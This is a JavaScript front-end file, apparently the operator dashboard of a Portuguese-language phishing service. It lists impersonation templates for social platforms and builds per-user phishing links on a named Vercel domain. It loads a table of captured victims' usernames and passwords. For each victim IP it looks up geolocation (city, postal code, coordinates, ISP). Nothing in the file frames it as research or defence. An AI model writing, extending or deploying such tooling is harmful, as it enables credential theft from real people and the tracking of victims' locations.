let painelPish = document.querySelector("#phishing")
let atualizar = document.querySelector("#atualizar")

const modal = document.getElementById("ipModal");
const modalData = document.getElementById("modalData");
const closeModal = document.getElementById("closeModal");

const pishDomain = "https://ciphertracer-eta.vercel.app"

listTemplate()
loadCaptures();

document.addEventListener("click", (e) => {

  if (e.target.id === "atualizar") {
    loadCaptures()
  }

  if (e.target.id === "button-ip") {
    listarInfo(e)
  }

})

async function listTemplate() {

  const usuarioDB = await buscarUsuario()
  const usuario = usuarioDB.user
  let uid = usuario._id

  const res = await fetch(domain + "/template", {
    method: "GET",
    credentials: "include"
  })

  let dados = await res.json()

  for (let i in dados) {

    painelPish.innerHTML += `
      <div class="card template-card">

        <span class="card-title">
          Social: <p id="template-name">${dados[i].nome}</p>
        </span>

        <div class="data-row" style="font-size:0.6rem;">
          <span class="data-label">tipo:</span>
          <span>${dados[i].tipo}</span>
        </div>

        <button class="btn-lab" style="margin-top:5px;">COPIAR LINK</button>

        <span id="link-cont" class="card-title">
          link:<br>
          ${pishDomain + dados[i].path}?ref=${uid}
        </span>

      </div>
    `
  }
}

async function loadCaptures() {

  const response = await fetch(domain + "/capture", {
    method: "GET",
    credentials: "include"
  })

  const data = await response.json()

  const tbody = document.getElementById("captureList")

  tbody.innerHTML = ""

  // se API retornar mensagem (ex: acesso expirado)
  if (!Array.isArray(data)) {

    if (data && data.ativo === false) {

      tbody.innerHTML = `
        <tr>
          <td colspan="4" style="color:red;font-size:18px;">
            ${data.message}
          </td>
        </tr>
      `

      return
    }
  }

  data.forEach(item => {

    let ip = item.ip || "-"

    if (ip.startsWith("::ffff:")) {
      ip = ip.replace("::ffff:", "")
    }

    const date = new Date(item.data_cap)

    const formattedDate = date.toLocaleString("pt-BR", {
      day: "2-digit",
      month: "2-digit",
      hour: "2-digit",
      minute: "2-digit"
    })

    const tr = document.createElement("tr")

    const tdDate = document.createElement("td")
    tdDate.textContent = formattedDate

    const tdPlatform = document.createElement("td")
    tdPlatform.textContent = item.platform

    const tdIp = document.createElement("td")

    const buttonIp = document.createElement("button")
    buttonIp.id = "button-ip"
    buttonIp.textContent = ip

    tdIp.appendChild(buttonIp)

    const tdData = document.createElement("td")
    tdData.style.color = "#0f0"

    const userText = document.createTextNode("Usuário: " + item.user)
    const br = document.createElement("br")
    const passText = document.createTextNode("Senha: " + item.pass)

    tdData.append(userText, br, passText)

    tr.append(tdDate, tdPlatform, tdIp, tdData)

    tbody.appendChild(tr)

  })

}

function listarInfo(e) {
  let ip = e.target.textContent
  ipInfo(ip)
}

async function ipInfo(ip) {

  try {

    const res = await fetch(`https://ipapi.co/${ip}/json/`)
    const data = await res.json()

    

    openIpModal(data)

  } catch {

    alert("Erro ao buscar informações do IP")

  }

}

function safe(value){
  if(value === undefined || value === null || value === "") return "Não disponível"
  return value
}

function openIpModal(data) {

  modalData.innerHTML = `

  <div class="section-title">LOCALIZAÇÃO</div>

  <div class="data-block">
    <span>Endereço IP:</span> ${safe(data.ip)}
  </div>

  <div class="data-block">
    <span>Cidade:</span> ${safe(data.city)}
  </div>

  <div class="data-block">
    <span>Estado:</span> ${safe(data.region)}
  </div>

  <div class="data-block">
    <span>País:</span> ${safe(data.country_name)}
  </div>

  <div class="data-block">
    <span>CEP aproximado:</span> ${safe(data.postal)}
  </div>

  <div class="data-block">
    <span>Localização no mapa:</span> 
    ${safe(data.latitude)}, ${safe(data.longitude)}
  </div>


  <div class="section-title">PROVEDOR DE INTERNET</div>

  <div class="data-block">
    <span>Empresa:</span> ${safe(data.org)}
  </div>

  <div class="data-block">
    <span>Código da rede (ASN):</span> ${safe(data.asn)}
  </div>

  <div class="data-block">
    <span>Faixa de IP:</span> ${safe(data.network)}
  </div>


  <div class="section-title">FUSO HORÁRIO</div>

  <div class="data-block">
    <span>Fuso:</span> ${safe(data.timezone)}
  </div>

  <div class="data-block">
    <span>Diferença UTC:</span> ${safe(data.utc_offset)}
  </div>


  <div class="section-title">DADOS DO PAÍS</div>

  <div class="data-block">
    <span>Moeda:</span> ${safe(data.currency_name)} (${safe(data.currency)})
  </div>

  <div class="data-block">
    <span>População:</span> 
    ${data.country_population ? Number(data.country_population).toLocaleString() : "Não disponível"}
  </div>

  `

  modal.style.display = "flex"
}

closeModal.onclick = () => modal.style.display = "none"

window.onclick = (e) => {
  if (e.target === modal) modal.style.display = "none"
}
